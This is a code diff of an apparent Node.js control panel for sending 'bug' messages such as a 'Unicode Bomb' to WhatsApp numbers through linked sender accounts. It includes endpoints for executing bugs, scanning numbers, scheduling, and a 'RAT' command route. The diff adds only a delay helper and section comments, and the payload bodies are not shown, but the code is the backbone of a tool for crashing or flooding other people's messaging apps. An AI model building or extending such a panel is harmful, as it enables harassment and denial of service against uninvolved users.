@@ -62,6 +62,7 @@ async function getSocket(phone) {
 async function sendBug(phone, target, type, intensity, duration) {
   const sock = await getSocket(phone);
   const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
+  const delay = (ms) => new Promise(res => setTimeout(res, ms));
   let payloads = [];
   switch (type) {
     case 'Unicode Bomb':
@@ -102,7 +103,7 @@ async function sendBug(phone, target, type, intensity, duration) {
   return true;
 }
 
-// ===== ENDPOINTS =====
+// ===== ENDPOINT LOGIN =====
 app.post('/api/login', (req, res) => {
   const { username, password } = req.body;
   db.get(`SELECT * FROM users WHERE username = ? AND password = ?`, [username, password], (err, row) => {
@@ -111,12 +112,14 @@ app.post('/api/login', (req, res) => {
   });
 });
 
+// ===== ENDPOINT STATS =====
 app.get('/api/stats', (req, res) => {
   db.get(`SELECT COUNT(*) as total FROM users`, (err, row) => {
     res.json({ online_users: 1, connections: 0, expiration: 'Lifetime', total_users: row ? row.total : 3, total_logs: 0 });
   });
 });
 
+// ===== ENDPOINT SENDER =====
 app.get('/api/sender/list', (req, res) => {
   db.all(`SELECT * FROM senders`, (err, rows) => { res.json(rows || []); });
 });
@@ -150,6 +153,7 @@ app.delete('/api/sender/delete/:id', (req, res) => {
   });
 });
 
+// ===== ENDPOINT BUG =====
 app.post('/api/bug/execute', async (req, res) => {
   const { target, type, intensity, duration, account } = req.body;
   if (!target || !type) return res.status(400).json({ error: 'Target dan tipe bug wajib!' });
@@ -166,6 +170,7 @@ app.post('/api/bug/execute', async (req, res) => {
   }
 });
 
+// ===== ENDPOINT LOGS =====
 app.get('/api/logs', (req, res) => {
   db.all(`SELECT * FROM logs ORDER BY created_at DESC LIMIT 100`, (err, rows) => { res.json(rows || []); });
 });
@@ -180,6 +185,7 @@ app.get('/api/logs/export', (req, res) => {
   });
 });
 
+// ===== ENDPOINT SCAN =====
 app.post('/api/scan', (req, res) => {
   const { count } = req.body;
   const numbers = [];
@@ -196,10 +202,12 @@ app.post('/api/scan/add-all', (req, res) => {
   res.json({ status: 'ok', added: numbers.length });
 });
 
+// ===== ENDPOINT SCHEDULE =====
 app.post('/api/schedule/add', (req, res) => { res.json({ status: 'ok' }); });
 app.get('/api/schedule/list', (req, res) => { res.json([]); });
 app.delete('/api/schedule/delete/:id', (req, res) => { res.json({ status: 'ok' }); });
 
+// ===== ENDPOINT RAT =====
 app.post('/api/rat/command', (req, res) => {
   const { command } = req.body;
   let response = `> Perintah "${command}" dikirim.`;
@@ -214,6 +222,7 @@ app.post('/api/rat/command', (req, res) => {
   res.json({ status: 'ok', output: response });
 });
 
+// ===== ENDPOINT USERS =====
 app.post('/api/users/add', (req, res) => {
   const { username, password, role } = req.body;
   if (!username || !password) return res.status(400).json({ error: 'Username dan password wajib' });
@@ -238,6 +247,7 @@ app.delete('/api/users/delete/:username', (req, res) => {
   });
 });
 
+// ===== ENDPOINT MONITOR =====
 app.get('/api/monitor/bot', (req, res) => { res.json({ status: 'online', uptime: 0, total_sent: 0 }); });
 app.get('/api/monitor/accounts', (req, res) => {
   db.all(`SELECT number as phone, 'connected' as status FROM senders`, (err, rows) => { res.json(rows || []); });
